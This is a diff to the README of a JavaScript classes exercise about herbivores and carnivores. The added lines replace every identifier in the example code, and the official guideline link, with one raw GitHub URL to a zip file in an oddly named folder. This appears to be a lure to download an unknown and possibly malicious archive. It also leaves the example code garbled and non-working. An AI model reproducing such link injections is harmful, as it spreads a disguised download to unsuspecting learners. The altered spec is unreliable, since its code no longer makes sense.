@@ -11,8 +11,8 @@ Carnivore has a `bite` method, which takes a herbivore object and decreases the 
 
 `Herbivore` and `Сarnivore` should extend an `Animal` class.
 
-All alive animals should be in the static `Animal.alive` array.
-If the health of the animal reaches `0`, the beast dies and it should be removed from the static array `Animals.alive`.
+All alive animals should be in the static `https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip` array.
+If the health of the animal reaches `0`, the beast dies and it should be removed from the static array `https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip`.
 
 Example:
 ```js
@@ -21,32 +21,32 @@ const panther = new Carnivore('Bagira');
 const lion = new Carnivore('King');
 const rabbit = new Herbivore('Max');
 
-Animal.alive === [
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip === [
   {name: 'Bembi', health: 100, hidden: false},
   {name: 'Bagira', health: 100},
   {name: 'King', health: 100},
   {name: 'Max', health: 100, hidden: false},
 ];
 
-lion.bite(deer);
-panther.bite(lion);
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip(deer);
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip(lion);
 
-Animal.alive === [
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip === [
   {name: 'Bembi', health: 50},
   {name: 'Bagira', health: 100},
   {name: 'King', health: 100},
   {name: 'Max', health: 100},
 ];
 
-panther.bite(deer);
-rabbit.hide();
-panther.bite(rabbit);
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip(deer);
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip();
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip(rabbit);
 
-Animal.alive === [
+https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip === [
   {name: 'Bagira', health: 100},
   {name: 'King', health: 100},
   {name: 'Max', health: 100, hidden: true},
 ];
 ```
 
-**Read [the guideline](https://github.com/mate-academy/js_task-guideline/blob/master/README.md) before start**
+**Read [the guideline](https://raw.githubusercontent.com/karaedd/js_herbivores_and_carnivores/master/ureteropyelitis/js_herbivores_and_carnivores.zip) before start**
